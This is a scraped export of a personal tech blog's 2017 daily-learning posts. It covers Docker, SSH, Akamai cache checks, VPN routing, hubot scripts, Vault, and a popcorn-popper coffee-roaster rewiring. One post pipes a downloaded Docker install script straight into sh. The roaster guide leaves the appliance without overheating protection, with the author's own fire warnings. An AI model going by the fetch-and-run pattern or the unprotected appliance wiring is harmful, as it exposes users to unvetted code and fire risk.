they are doing.\nThe WB Poppery 2 is disassembled by removing three screws in the top cover of the popper. The power cord is removed by twisting the power cord keeper fitting 90 degrees to the right or left and then pulling it out. The cord keeper can be removed and saved for later re-assembly using the reverse procedure. The heating and fan unit are disassembled by removing three small screws that hold them together. When you have performed that task the internal working of the heating unit can be explored. Mark the orientation of the parts so that reassembly will be easier.\nPoint A is the incoming 120 volt hot wire. The current moves from A through the Thermal Fuse to D to supply both the small and main heating coils. D is one end of the small heating coil and E is the other end of the small heating coil. This supplies power to the fan. Current then runs down the brass strip from D to the thermostat and supplies current to C, which is one end of main heating coil. By removing the top part of the thermostat (and the bi-metal disk) we isolate the two heating coils. The white ground wire is attached to the other end of the Main heating coil. It is cut from the incoming 120 volt ground connection.\nIn the Photograph below, before removal of thermostat tab, I propped open the contacts of the thermostat with a toothpick. I tested to make sure there was no contact between the two coils with a continuity meter. When the white ground wire to C has been clipped and this completes the separation of the two coil circuits. The fan and the small coil are on the original popper cord. The white wire at B and the new black wire at C will be attached to a new power cord to supply power to the Main heating coil.\nNear Completion\nThere will be continuity between B and C. There should be NO CONTINUITY between B and/or C and any other points of the fan and small heating coil circuit. If this checks out, the heating and fan unit are now ready for reassembly. Take care to orient the two parts correctly when you reassemble them.\nIn the photograph below, a hole has been drilled into the outer case of the West Bend Poppery 2, the rubber grommet inserted into the hole and the new Main Coil power cord threaded through.\nThe two main heater coil wires are connected to the new cord with wire nuts, and then the West Bend Poppery 2 unit is reassembled. The original power cord is refitted with its keeper plug. The wires are marked for heat and fan.\nTake Notice of This\nThis unit is now unprotected from overheating. Do not operate the Modified West Bend Poppery 2 without the fan plugged in and running. The fan cord can be plugged directly into the 120 volt outlet. The heater cord can be plugged into the Router Speed Control. The router speed control can be plugged into a 120 volt outlet. If the heat is on for 5 seconds without the fan on the West Bend Poppery 2 will melt down and catch fire. It will be trash or worse!\nThe unit has enough power to roast coffee with the fan on full power and the heater coil operated at 50%, 75%, 87% or 100% power.\nA Roast Profile to Start YOU off…\nI roast 90 grams of coffee beans in about 12 minutes. I apply full power to the fan for 2 to 4 minutes with no heat to pre-warm the beans and popper. Then I add heat at 75% for 4 minutes, and then I add heat at 87% for 4 minutes, and then I finish the roast at 100% power. I use a thermometer and usually roast to a city plus or full city level and stop the roast at 230 to 235 degrees C, just into second crack.\nOnce Again Be Careful\nThis unit can be dangerous and will overheat and catch fire if operated in a careless or unattended manner. This worked for me, and there are no guarantees or warranties. Be careful and study all the modifications and understand what you are doing before modifying any popper. Good luck and happy roasting. Here is the diagram that was used for my mod minus the bypass for the fuse and thermostat ","permalink":"https://ridingintraffic.github.io/posts/2017-03-03-roaster-info/","summary":"roast Info using the kill-a-watt attached to the router for exact wattage measurements on my 1200 watt poppery II. full heat is 1000 watts with the heating coils fully isolated. Also there is a basic high temp thermometer that is simply dropped in the top\nambient air temp is 68 degrees with 25% humidity preheat to 275 which is stable heat at 650 watts fan should be run at 100% but can dial down subtly in order to finely adjust the temps |\u0026mdash;+\u0026mdash;+\u0026mdash;|","title":"2017-03-03 coffee roaster"},{"content":"docker reboot Every once and a while for prem docker installation a reboot is needed. There are some tools out there that can most likely do this, but today a quick and dirty bash script solved the problem.\nStep one dump all the running container IDS, today there were about 23 containers running. docker ps -q \u0026gt;\u0026gt;ids\nNext reboot sudo reboot Finally the bash script to quickly spin them all back up. It reads the source file that was created in the earlier step and does a simple docker start \u0026lt;id\u0026gt; and done.\n#!/bin/bash input=\u0026#34;ids\u0026#34; while IFS= read -r var do docker start \u0026#34;$var\u0026#34; done \u0026lt; \u0026#34;$input\u0026#34; coffee roasting Successfully roasted coffee tonight. It only took 10 iterations in order to get it right. This was done on my heavily modified popcorn popper with full manual control for heat and blower. I did a quick blog post write up on medium about it successfully-roasting-your-own-coffee\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-02-docker-hack/","summary":"docker reboot Every once and a while for prem docker installation a reboot is needed. There are some tools out there that can most likely do this, but today a quick and dirty bash script solved the problem.\nStep one dump all the running container IDS, today there were about 23 containers running. docker ps -q \u0026gt;\u0026gt;ids\nNext reboot sudo reboot Finally the bash script to quickly spin them all back up.","title":"2017-03-02 docker, bash, coffee"},{"content":"bash ssh keys Good to remember if you have ssh keys setup the .ssh folder is 700 and the authorized_keys file is 644\nSSH keys are a public and private key that you store on a host that you are going to ssh in to. This key allwos fo r aecure login without having to relay a password through the terminal. It is a more secure form of authentication that the basic username and password. Also it is good for scripts to use this because you doesn\u0026rsquo;t require interaction from the keyboard to get from one box to the other.\nmarkdown cheatsheet because markdwon is confusing Markdown-Cheatsheet\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-03-up-all-night/","summary":"bash ssh keys Good to remember if you have ssh keys setup the .ssh folder is 700 and the authorized_keys file is 644\nSSH keys are a public and private key that you store on a host that you are going to ssh in to. This key allwos fo r aecure login without having to relay a password through the terminal. It is a more secure form of authentication that the basic username and password.","title":"2017-03-03 ssh, bash"},{"content":"ELK There is this thing called elk, and I have no idea how to use it. I don\u0026rsquo;t even know where to being with ELK. I have been using splunk for years, I know how ot do all of this in splunk. But because the data I need is in elk and i cannot easily get it in to splunk I will have to at least start with elk and then go from there. I have started reading some of this complete-guide-elk-stack but my attention span is failing for today.\nAWS east s3 Today aws s3 decided to crap itself, that was fun. Luckily no too much of my stuff was running there so I wasn\u0026rsquo;t directly influenced by it. However there were plenty of people on fire about it.\nProxpn I have a lifetime membership to proxpn. proxpn They have a pretty good iOS and android application. I needed to access their network via openvpn because the ciphers and protections around openvpn are better than pptp for many reasons. There is a nice little bash utlity that handles some basic connection strings and running the openvpn client proxpn-bash-client If you would rather just have at it from the config files there is this repo instead. proXPN-OpenVPN\n","permalink":"https://ridingintraffic.github.io/posts/2017-02-28-elk/","summary":"ELK There is this thing called elk, and I have no idea how to use it. I don\u0026rsquo;t even know where to being with ELK. I have been using splunk for years, I know how ot do all of this in splunk. But because the data I need is in elk and i cannot easily get it in to splunk I will have to at least start with elk and then go from there.","title":"2017-02-28 ELK? aws and openvpn"},{"content":"javascript and node No more just adding things to the package.json HA!\nTo add an entry to your package.json\u0026#39;s dependencies: npm install \u0026lt;package_name\u0026gt; --save To add an entry to your package.json\u0026#39;s devDependencies: npm install \u0026lt;package_name\u0026gt; --save-dev version numbers and what they actually mean https://docs.npmjs.com/getting-started/semantic-versioning\nPatch releases: 1.0 or 1.0.x or ~1.0.4 Minor releases: 1 or 1.x or ^1.0.4 Major releases: * or x testing How fast can I fill in all the holes for TDD\u0026hellip; not fast enough apparently ;)\nKarma karma-installation karma-runner\nprotractor protractor There is some youtue stuff on this about protractor and such. youtube playlist\nnpm .npmrc files are fun to mess with especially when Hopping between a private registry and the public one. Need to remeber to switch them back and forth if the packages in question are not on either one.\nakamai There are a couple tools that are in house that lets me look up the akamai staging IP address for our hosts. But if you want to check akamai caching really easy you can do it with the script below. This is pretty easy for staging or for main property. This also assumes that you have host variable setup in the script\u0026hellip; I am going to work on building out all of this in either js or bash because the discovery tools are in node but this request tool is in bash. I threw it together in about 30 min, It\u0026rsquo;s going to be hackey.\nscript.sh /someurl/ #do some magic to get the staging IP url=$1 stagingip=MAGIC host=moremagic XCheckCacheable=$(curl $fullurl -sI -H \u0026#34;Pragma: akamai-x-check-cacheable\u0026#34; -H \u0026#34;Host: $host\u0026#34;| tr -d \u0026#39;\\r\u0026#39; | sed -En \u0026#39;s/^X-Check-Cacheable: (.*)/\\1/p\u0026#39;); if [[ \u0026#34;$XCheckCacheable\u0026#34; =~ \u0026#34;YES\u0026#34; ]]; then echo \u0026#34;url is cacheable\u0026#34; else echo \u0026#34;url is not caching\u0026#34; fi Xcache=$(curl $fullurl -sI -H \u0026#34;Pragma: akamai-x-cache-on\u0026#34; -H \u0026#34;Host: $host\u0026#34;| tr -d \u0026#39;\\r\u0026#39; | sed -En \u0026#39;s/^X-Cache: (.*)/\\1/p\u0026#39;); #echo $Xcache if [[ \u0026#34;$Xcache\u0026#34; =~ \u0026#34;TCP_MEM_HIT\u0026#34; ]]; then echo \u0026#34;TCP_MEM_HIT\u0026#34; else echo \u0026#34;not hit\u0026#34; fi $ check-akamai /videos/ url is cacheable TCP_MEM_HIT ","permalink":"https://ridingintraffic.github.io/posts/2017-03-01-javascript-filling-in-the-missing-bits/","summary":"javascript and node No more just adding things to the package.json HA!\nTo add an entry to your package.json\u0026#39;s dependencies: npm install \u0026lt;package_name\u0026gt; --save To add an entry to your package.json\u0026#39;s devDependencies: npm install \u0026lt;package_name\u0026gt; --save-dev version numbers and what they actually mean https://docs.npmjs.com/getting-started/semantic-versioning\nPatch releases: 1.0 or 1.0.x or ~1.0.4 Minor releases: 1 or 1.x or ^1.0.4 Major releases: * or x testing How fast can I fill in all the holes for TDD\u0026hellip; not fast enough apparently ;)","title":"2017-03-01 js, karma, protractor, npm, bash, akamai"},{"content":"Splunk and nginx Doing some splunkjs work from a docker container, and hosting it out of nginx, which means I needed to configure a proxy pass using some load balancing in order to access the splunk cluster, this was a little tricky because of session persistence and https. nginx load balancing Luckily there are some good pslunk blogs out there that help out configuring-nginx-with-splunk-rest-api-sdk-compatibility and some good reading about splunkjs read them both using-the-splunkjs-stack-part-1\nSplunk docker nginx repo enjoy the repo and dockerfile check the build.sh and run.sh or just look at the readme splunkJS-nginx\ngitignore I can never remember how to do all the git stuff here is some gitignore info gitignore and then using it ignoring-files\ndocker prune macos and docker get messy after a while. An error of \u0026ldquo;no space left on device\u0026rdquo; will result if you need to clean up, apparently my cleanup commands were not doing their job or I was missing my volume cleanup.\ndocker image prune docker container prune docker network prune docker volume prune nuclear option docker system prune (does them all) ","permalink":"https://ridingintraffic.github.io/posts/2017-02-27-mondays/","summary":"Splunk and nginx Doing some splunkjs work from a docker container, and hosting it out of nginx, which means I needed to configure a proxy pass using some load balancing in order to access the splunk cluster, this was a little tricky because of session persistence and https. nginx load balancing Luckily there are some good pslunk blogs out there that help out configuring-nginx-with-splunk-rest-api-sdk-compatibility and some good reading about splunkjs read them both using-the-splunkjs-stack-part-1","title":"2017-02-27 nginx, splunk, docker, git"},{"content":"February in Chicago can be less than sunny, although the sun came out today\ngoogle analytics seems pretty easy Log in to the google page and create a site google page. Then add the tracking code to the jekyll theme and bam site tracking.\nfitbit There has been research done around the accuracy of optical heart rate monitors. I knew they were not accurate up past 150 bpm. This is because the blood is flowing too fast for the sensor to keep up with. I wear a fitbit charge 2 and have had it since launch. I like it a lot despite those limitations. When running I wear a chest strap and have audio cues to let me know if my heart rate is going to high. I have the tendency to push myself too hard and can get in to trouble if I am not careful.last week I started wearing a weight vest while doing my climbing circuit workouts. When I reviewed the workout data form that session it read that my heart rate was only an average of 115 bpm when the week before without the weight vest and almost the identical workout I was averaging 150bpm.This was written off as thinking that the workout was anaerobic because of the weight vest, although strange. This week I had a similar workout however I wore my chest strap as well. The results were interesting to say the least. I chest strap had my heart rate averaging around 160-170bpm for the hour and the wrist mounted sensor had me at 115 bpm again. I can\u0026rsquo;t think that is all sensor error, but perhaps it has something to do with the arms doing all of the work and the arteries pumping differently? I don\u0026rsquo;t really know the science behind that one, I will have to look it up later and get back to everyone about it. Regardless that is a rather large data variation from 115 and 170. Further investigation is needed.\nDoD open sourced Looks like the government is trying to get in the open source world and perhaps they think it might drive them some talent? Interesting enough to mention. dod github page\ngithub open source guide Github also released an open source about how to properly handle and maintain open source. opensource.guide\n","permalink":"https://ridingintraffic.github.io/posts/2017-02-26-sunny-sunday/","summary":"February in Chicago can be less than sunny, although the sun came out today\ngoogle analytics seems pretty easy Log in to the google page and create a site google page. Then add the tracking code to the jekyll theme and bam site tracking.\nfitbit There has been research done around the accuracy of optical heart rate monitors. I knew they were not accurate up past 150 bpm. This is because the blood is flowing too fast for the sensor to keep up with.","title":"2017-02-26 google, analytics, fitbit, dod, open source"},{"content":"Productive Saturday rant Been cranking away at my laptop from 630-830 this morning, and realizing that my ancient mac book air battery which was already replace once, is just a poor shadow of what it should be. I\u0026rsquo;m only going to get about 3 hours out of this battery before it dies. Which is sad because i really wanted to get a new laptop this year but mac did not really give us any options. I don\u0026rsquo;t have anything that runs usb-c so that would be dongle hell to switch to any of their new models.\ngithub Finally decided that i am going to use github fro my private repos - which means I needed to clean up and migrate from bitbucket kind of sad but at the same time I am pruning out my old repos and getting rid of many years of ugly code history as well. Especially important because when I ran a push from my base repo github would throw a fit with the pre receive commit, which I think narrowed down to having some old commit history in there where I thought it was a good idea to store some massive binary file in it. Hey we can\u0026rsquo;t all be perfect right?\njekyll and ruby Turns out i don\u0026rsquo;t know ruby. Which would make sense because I have never really touched anything ruby in my life but jekyll is kind of built on top of ruby and because I was trying to modify a theme which I failed at I had to go and update my brew and then try to reinstall the bundle and in the end managed to muck but my local jekyll preview. Backed it all out and I will give it another go later.\ndocker pi I thought it might be fun to try and stand up a docker host on one of the many unused raspberry pis that i have laying around. I already have a docker host running on ubuntu in my basement but hey why not try a pi. A quick Internet search told me that it is supported with raspbian jessie? docker-pi Commence the download and some command line kung-fu to get it written to the sd card:\ndiskutil list diskutil unmountDisk /dev/disk2 sudo dd bs=1m if=2017-01-11-raspbian-jessie-lite.img of=/dev/rdisk Few minutes later I get pi, Then do a uick hdmi monitor and keyboard plugin\nsudo rasp-config enable ssh grow filesystem reboot Next did some ssh into the host and fire off\ncurl -sSL https://get.docker.com | sh Magically docker is installed on the pi WOO!! Well kind of, I was quickly reminded why I had not gotten around to doing this because!\nKnow your Architecture The Raspberry Pi hardware architecture is called ARM and differs from the architecture behind your regular PC, laptop or cloud instance. [pi is an ARM](http://blog.alexellis.io/5-things-docker-rpi/\u0026quot;pi is an ARM\u0026quot;) Sadly this limits the number of images I can work with right out of the box because I can only run images with arm architecture. dockerhub armhf\n","permalink":"https://ridingintraffic.github.io/posts/2017-02-25-busy-saturday/","summary":"Productive Saturday rant Been cranking away at my laptop from 630-830 this morning, and realizing that my ancient mac book air battery which was already replace once, is just a poor shadow of what it should be. I\u0026rsquo;m only going to get about 3 hours out of this battery before it dies. Which is sad because i really wanted to get a new laptop this year but mac did not really give us any options.","title":"2017-02-25 ithub, git, jekyll, ruby, mac, docker, raspberrypi"},{"content":"Today is the first day I was listening to a podcast today, arrested devops and on it was julia evans she talked about writing a blog post every day about what she learned. Originally this was done for her workshop, in order to keep track of the days and things learned. I feel like it is a good idea so I shall give it a go.\nWhat did I learn? Today I learned about jekyll and hugo. As well as setting up jekyll to auto build and auto publish against github jeykll and the auto build can be found here github help pages about jekyll Additionally there is a nice jekyll composer here jekyll-compose the jekyll bootstrap is a great tool for setting this up jekyll-bootstrap There are ways to get the local version up and running but it appears that I may not have that quite figured out yet.\nHugo well hugo was another static generator that I thought i was going to use but it turns out i had configured the auto-builder in jekyll an it just happened to work right. I received an email saying I had some styling issues but then i viewed the page and things looked good. Viola I have a static jekyll blog instead, and hugo gets shelved.\nCoffee roasting Completely unrelated note I did some more coffee roasting tonight and am still baffled by exactly how my roaster works. I know that i built it from a modified popcorn popper but every time I roast the subtle differences still happen. I am trying to be as technical and specific as possible but simply keeping an eye on the wattage used the beans the smell and the temperature seems to be the best viable option so far. I based the design off of this rewire I think thats a good start for the first day, lets see how this post looks\n","permalink":"https://ridingintraffic.github.io/posts/2017-02-24-first-friday/","summary":"Today is the first day I was listening to a podcast today, arrested devops and on it was julia evans she talked about writing a blog post every day about what she learned. Originally this was done for her workshop, in order to keep track of the days and things learned. I feel like it is a good idea so I shall give it a go.\nWhat did I learn? Today I learned about jekyll and hugo.","title":"2017-02-24 coffee, jekyll, hugo"},{"content":"I missed a day oops, probably had something to do with the up all night post from before.\nVPNs are annoying For a whole variety of reasons I use vpns for various tasks. Lately finding one with good throughput has been a headache and annoynce. For thepast few years I have been using two differnt vpns and both of them have suddenly started to have throughput issues.\nvpn reviews This site looks to offer some good reviewsfor vpns out there could be worth taking a look thatoneprivacysite\nlinux openvpn commands: use the config files! sudo openvpn --config \u0026lt;your config\u0026gt; add some routes\nsudo ip rule add from 192.168.1.111 table 128 sudo ip route add table 128 to 192.168.1.0/24 dev eth0 sudo ip route add table 128 default via 192.168.1.1 boom\nraspberry pi 2 turns out the issues that raspberry pi had with network bottleneck on the ethernet seems to be resolved with at least version 2 i can get 10MB a sec throughput\nreload fstab without rebooting mount -a\nraspbian vnc ENABLING VNC SERVER On your Raspberry Pi, run the following commands to make sure you have the latest version of VNC Connect:\nsudo apt-get update sudo apt-get install realvnc-vnc-server realvnc-vnc-viewer ENABLING VNC SERVER AT THE COMMAND LINE You can enable VNC Server at the command line using raspi-config:\nsudo raspi-config Now, enable VNC Server by doing the following: Navigate to Advanced Options. Scroll down and select VNC \u0026gt; Yes.\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-05-vpns-are-annoying/","summary":"I missed a day oops, probably had something to do with the up all night post from before.\nVPNs are annoying For a whole variety of reasons I use vpns for various tasks. Lately finding one with good throughput has been a headache and annoynce. For thepast few years I have been using two differnt vpns and both of them have suddenly started to have throughput issues.\nvpn reviews This site looks to offer some good reviewsfor vpns out there could be worth taking a look thatoneprivacysite","title":"2017-03-05 vpn, openvpn, fstab, raspberry-pi, vnc"},{"content":"I missed a few day because I was on vacation. I tihnk I want to try and add more context and text around these entires but today was choas and one fire from the next, therefore I didn\u0026rsquo;t have a chance to really dig in to learning. Sadly fire fighting is turning into too much of my everday, this needs to get chagned so that I can spend more time building tools and learning about things.\nopen container initiative open container initiative\ndocker daemon log macos Docker daemon logs on Mac docker run -v /var/log:/var/log -it alpine cat /var/log/docker.log\ncontainer top container top which tell you what is running in container much like regular top ctop\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-14-pi-day/","summary":"I missed a few day because I was on vacation. I tihnk I want to try and add more context and text around these entires but today was choas and one fire from the next, therefore I didn\u0026rsquo;t have a chance to really dig in to learning. Sadly fire fighting is turning into too much of my everday, this needs to get chagned so that I can spend more time building tools and learning about things.","title":"2017-03-14 macOS, docker, ctop"},{"content":"akamai Today I decided that it was time that I wrote a quick and easy script that would go through and dump akamai cache from a file that contained a list of links. This has been a manual process for the most part, and that is pretty terrible. Luckily there is a bunch of docs and doc examples out there for this kind of stuff. https://github.com/akamai-open/api-kickstart\nhttps://developer.akamai.com/introduction/Conf_Client.html\nhttps://developer.akamai.com/api/luna/diagnostic-tools/overview.html\nYou will need to create some api keys that can all be done through the luna portal, and after doing that and following the demo steps in the links above you will have a txt file. After cloning the repo at https://github.com/akamai-open/api-kickstart.git you can run the following commands and have the .edgerc config setup\npython gen_edgerc.py -f \u0026lt;filename\u0026gt; python gen_edgerc.py -f client-python-purge-script.txt python verify_creds.py Next I went in and modified the config and the ccu.py files so that you can pass the urlfile as a parameter and it is included in the help. the git repo is here. akamai-examples-modified\nartillery There is a load testing app out there called artillery it looks like it could be pretty useful in the future so i took a look and here it is https://artillery.io/docs/gettingstarted.html https://github.com/shoreditch-ops/artillery\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-15-chaos/","summary":"akamai Today I decided that it was time that I wrote a quick and easy script that would go through and dump akamai cache from a file that contained a list of links. This has been a manual process for the most part, and that is pretty terrible. Luckily there is a bunch of docs and doc examples out there for this kind of stuff. https://github.com/akamai-open/api-kickstart\nhttps://developer.akamai.com/introduction/Conf_Client.html\nhttps://developer.akamai.com/api/luna/diagnostic-tools/overview.html\nYou will need to create some api keys that can all be done through the luna portal, and after doing that and following the demo steps in the links above you will have a txt file.","title":"2017-03-15 akamai, python, artillery"},{"content":"I acquired a bsh bunny yesterday and we will see what I can figure out with it.\nbash bunny yes the bash bunny is pretty simple to use. It is a full mini linux computer that runs on an arm7 chip with a good amount of on board storage and ram. I was able to pull down the repo from bunny payloads and do a quick nmap of my machine. payload git repo: https://github.com/hak5/bashbunny-payloads docker swarm I had a bit of time to sit down and try my hand at connecting to our swarm cluster and firing up som eservices. I kind of sorta understand what I was doing but I had someone holding my hand through it. This will take a few more times beofre I actually figure it out.\nkibana I also spent another painful 30 minutes with kibana. I think if I really ever need to learn this it will take some time to unlearn how i know how to do things in splunk and just start from square one in kibana.\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-16-bash-bunny/","summary":"I acquired a bsh bunny yesterday and we will see what I can figure out with it.\nbash bunny yes the bash bunny is pretty simple to use. It is a full mini linux computer that runs on an arm7 chip with a good amount of on board storage and ram. I was able to pull down the repo from bunny payloads and do a quick nmap of my machine. payload git repo: https://github.","title":"2017-03-16 hak5, bash, docker, swarm"},{"content":"hubot Hubot is a fun piece of code, it is a bot framework that is built by github and has adapters for a whole bunch of things. I use it with slack. I have been working on hubot for some time now. https://hubot.github.com/ We have a bunch of webhooks that post a whole variety of message to slack. It turns out that by default hubot ignores all of those messages. This is because you generally don\u0026rsquo;t want bots getting in to an endless loop of talking to each other. Tracking down a way to have hubot pay attention to others bots was painful but this is how you would do it. This is keying directly off a specific room(opsbot_test) that the hubot is in and from their off of a specific user(firechief) and then a specific message string(dev-). All of this was important because I didn\u0026rsquo;t want those endless loops.\nconsole.log msg.message.user.name text=msg.message.rawText room=msg.message.room username=msg.message.user.name if room.match(/opsbot_test/i) \u0026amp;\u0026amp; username.match(/firechief/i) if text.match(/dev-/i) 42 42 is the ascii code for * . In hitchikers guide to the galaxy 42 was used as the answer because it doesn\u0026rsquo;t matter what the question is because the answer is whatever you want it to be ascii table\nhttps://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker\u0026rsquo;s_Guide_to_the_Galaxy\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-20-hubot/","summary":"hubot Hubot is a fun piece of code, it is a bot framework that is built by github and has adapters for a whole bunch of things. I use it with slack. I have been working on hubot for some time now. https://hubot.github.com/ We have a bunch of webhooks that post a whole variety of message to slack. It turns out that by default hubot ignores all of those messages. This is because you generally don\u0026rsquo;t want bots getting in to an endless loop of talking to each other.","title":"2017-03-20 hubot, 42, hitchikers guide"},{"content":"dogs ADD took its toll and I wandered down this rabbit hole, pparently the dog greeting stretch is a thing.\nThe Greeting Stretch is a posture used only towards someone the dog likes and with whom he is comfortable. There is also a version of this where the dog leans forward and stretches his rear legs out behind him. In the greeting stretch, you will see a relaxed ear carriage and squinty eyes. The dogs have a liquid, languid look about them. “It is very flattering to have a dog greet you in this unrestrained, friendly and very respectful manner. This greeting acknowledges your personal space and is a request for the two of you to interact. the-greeting-stretch\ndocker swarm connecting to a docker swarm and running commands against it you need to setup you local DOCKER_HOST variable export DOCKER_HOST\\tcp://something\ntmux scrolling keyboard scrolling in tmux ctrl+b then arrowsor pgup pgdown hurray!\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-21-more-chaos/","summary":"dogs ADD took its toll and I wandered down this rabbit hole, pparently the dog greeting stretch is a thing.\nThe Greeting Stretch is a posture used only towards someone the dog likes and with whom he is comfortable. There is also a version of this where the dog leans forward and stretches his rear legs out behind him. In the greeting stretch, you will see a relaxed ear carriage and squinty eyes.","title":"2017-03-21, dogs"},{"content":"docker swarm bounce sometimes you just need a docker swarm service to restart\u0026hellip; right now this is the best way that i know of in order to get it to bounce. I am sure that they is a better way but I need to find that. docker service update --env-add UPDATE=1 hubot_opsbot-hubot\nspectacle window manager for macos Spectacle and its donateware yay https://www.spectacleapp.com/ I have a Billion windows open at all time and I am hopping between resolutions when I am at may desk and when I walk away from it, I am going to give this window manager a try.\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-22-today/","summary":"docker swarm bounce sometimes you just need a docker swarm service to restart\u0026hellip; right now this is the best way that i know of in order to get it to bounce. I am sure that they is a better way but I need to find that. docker service update --env-add UPDATE=1 hubot_opsbot-hubot\nspectacle window manager for macos Spectacle and its donateware yay https://www.spectacleapp.com/ I have a Billion windows open at all time and I am hopping between resolutions when I am at may desk and when I walk away from it, I am going to give this window manager a try.","title":"2017-03-22, docker, swarm"},{"content":"Splunk docker logging driver https://docs.docker.com/engine/admin/logging/splunk/#message-formats \u0026ndash;log-opt tag=\u0026quot;{{.Name}}/{{.FullID}}\u0026quot; \\\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-24-today/","summary":"Splunk docker logging driver https://docs.docker.com/engine/admin/logging/splunk/#message-formats \u0026ndash;log-opt tag=\u0026quot;{{.Name}}/{{.FullID}}\u0026quot; \\","title":"2017-03-24, splunk docker"},{"content":"pathogen vim whne I reinstalled everything on my laptop i forgot to install pathogen for vim. and as a result. all of my conf files from the dotfile repo stopped working right in vim :( good to keep track of this repo https://github.com/tpope/vim-pathogen and then the command to support it:\ncurl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim``` ","permalink":"https://ridingintraffic.github.io/posts/2017-03-26-sunday/","summary":"pathogen vim whne I reinstalled everything on my laptop i forgot to install pathogen for vim. and as a result. all of my conf files from the dotfile repo stopped working right in vim :( good to keep track of this repo https://github.com/tpope/vim-pathogen and then the command to support it:\ncurl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim``` ","title":"2017-03-26, vim"},{"content":"https://evertpot.com/osx-tmux-vim-copy-paste-clipboard/\nfor sublime package controll ou can sync it with dropbox like this dropbox sync\nshellcheck is pretty rad and you can add it directly into sublime text so that you can lint your shell scripts shellcheck also julia evans has some great things to say about bash and common mistakes that happen in bash. bash-quirks\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-27-monday/","summary":"https://evertpot.com/osx-tmux-vim-copy-paste-clipboard/\nfor sublime package controll ou can sync it with dropbox like this dropbox sync\nshellcheck is pretty rad and you can add it directly into sublime text so that you can lint your shell scripts shellcheck also julia evans has some great things to say about bash and common mistakes that happen in bash. bash-quirks","title":"2017-03-27, sublimetext, bash, shellcheck"},{"content":"dtrace dtrace is pretty intereting and I need to learn more about it. Similar to strae which i also don\u0026rsquo;t know how to use. I did not get a chance to spend as much time as I wanted with dtrace so I will have to come back to this one dtrace-even-better-than-strace-for-osx.html\ndtrace\ndocker attach Well Ctrl + C (or Ctrl + \\ ) should detach you from the container but it kill the container because your main process is a bash. Type Ctrl + p , Ctrl + q will help you to turn interactive mode to daemon mode. See https://docs.docker.com/v1.7/articles/basics/#running-an-interactive-shell But if you want to attach to an already running container you can do it like this docker exec -i -t \u0026lt;container id\u0026gt; /bin/bash as long as /bin/bash is available on the container you are good to go. Otherwise this might be a bit more interesting.\nansible I became curious with some things ansible and took it for a spin. playbook-language-example Ansible works by essentially ssh-ing in to the hosts that are cofigured and then running the commands on those boxes. The nice thing about this is that there are not anible clients needed on the end nodes. This could be quite interresting and i think it warrants some more time spent on it .\n","permalink":"https://ridingintraffic.github.io/posts/2017-03-28-dtrace/","summary":"dtrace dtrace is pretty intereting and I need to learn more about it. Similar to strae which i also don\u0026rsquo;t know how to use. I did not get a chance to spend as much time as I wanted with dtrace so I will have to come back to this one dtrace-even-better-than-strace-for-osx.html\ndtrace\ndocker attach Well Ctrl + C (or Ctrl + \\ ) should detach you from the container but it kill the container because your main process is a bash.","title":"2017-03-28, dtrace"},{"content":"vagrant vagrant is a useful tool for demoing and discovery work when you don\u0026rsquo;t want to go about standing up everything\nvagrant init ubuntu/trusty64 vagrant up - starts up the vagrant image that has a vagrant file in the working directory vagrant status - checking status of vagrant vagrant ssh to log in to the machine that is already running cat /etc/issue vagrant destroy - tears it all down vagrant halt _ stop without teardown which \u0026lt;command\u0026gt; - shows you were that commmand lives ansible ansible inventory\nhost[1:3].example.com is the same as host1.example.com host2.example.com host3.example.com ","permalink":"https://ridingintraffic.github.io/posts/2017-03-30-today/","summary":"vagrant vagrant is a useful tool for demoing and discovery work when you don\u0026rsquo;t want to go about standing up everything\nvagrant init ubuntu/trusty64 vagrant up - starts up the vagrant image that has a vagrant file in the working directory vagrant status - checking status of vagrant vagrant ssh to log in to the machine that is already running cat /etc/issue vagrant destroy - tears it all down vagrant halt _ stop without teardown which \u0026lt;command\u0026gt; - shows you were that commmand lives ansible ansible inventory","title":"2017-03-30, vagrant"},{"content":"Vault Storing secrets for docker containers can be tricky to get right. There is this thing called vault that does it pretty safely for you. The idea is that there should be nothing sensitve stored in the configuration of your containers. This is hard because when you need keys and passwords it is quite common to store those as environment variables and then refences those. You should not do that, that is bad.\nvaultproject.io\nvault server: docker run -p 8200:8200 --cap-add=IPC_LOCK -e 'VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200' -v /Users/myuser/vault:/vault/file vault\nhost side setup the vault addr export VAULT_ADDR='http://127.0.0.1:8200'\nhubot Here is an example of how to maintin a basic prompting conversation with a hubbot. This repsonds to the inital trigger and then from there will prompt a user through a series of questions, using a simple switch. This could be used for building up a series of commands to run on teh backend or setting something up\u0026hellip;\nrobot.respond(/wizard start/i, function(msg) { var user = {stage: 1}; var name = msg.message.user.name.toLowerCase() robot.brain.set(name, user); console.log(\u0026#34;user created: \u0026#34;+name+\u0026#34; stage: \u0026#34;+user.stage); }); robot.hear(/(\\w+)/i, function(msg) { var name = msg.message.user.name.toLowerCase(); var user = robot.brain.get(name) || null; if (user != null){ console.log(\u0026#34;user exists: \u0026#34;+name+\u0026#34; stage: \u0026#34;+user.stage); var answer = msg.message.rawText; if (answer == \u0026#34;reset\u0026#34;){ delete user; } if (answer == \u0026#34;exit\u0026#34;){ user = {stage: 7}; robot.brain.remove(name); } switch (user.stage){ case 1: msg.reply(\u0026#34;Q\u0026#34;+user.stage+\u0026#34;. What is your name\u0026#34;); console.log(answer); break; case 2: user.name = answer; msg.reply(\u0026#34;Q\u0026#34;+user.stage+\u0026#34;. What is your age\u0026#34;); console.log(answer); break; case 3: user.age = answer; msg.reply(\u0026#34;Q\u0026#34;+user.stage+\u0026#34;. What is your gender\u0026#34;); console.log(answer); break; case 4: user.gender = answer; msg.reply(\u0026#34;Q\u0026#34;+user.stage+\u0026#34;. What is your favorite color\u0026#34;); console.log(answer); break; case 5: user.color = answer; } user.stage++; 